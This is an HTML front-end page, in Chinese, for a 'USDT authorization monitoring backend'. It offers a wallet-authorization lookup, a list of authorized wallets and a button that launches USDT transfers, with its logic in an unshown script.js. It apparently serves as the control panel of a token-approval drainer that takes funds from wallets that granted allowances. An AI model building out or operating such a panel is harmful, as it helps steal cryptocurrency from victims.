<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <title>USDT 授權監控後台</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="manifest" href="manifest.json" />
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
    <h1>USDT 授權監控後台</h1>

    <!-- 手動檢查授權 -->
    <div>
        <label for="checkWallet">輸入錢包地址查詢是否授權：</label>
        <input type="text" id="checkWallet" placeholder="輸入錢包地址">
        <button onclick="checkWallet()">查詢授權</button>
    </div>
    <br>
    <!-- 顯示查詢結果 -->
    <div id="walletInfo">
        <h3>已授權錢包列表：</h3>
        <ul id="walletsList"></ul>
    </div>
    <br>

    <!-- 轉帳功能 -->
    <div>
        <label for="amount">輸入轉帳金額 (USDT): </label>
        <input type="number" id="amount" placeholder="金額">
        <button onclick="triggerTransfer()">發動轉帳</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
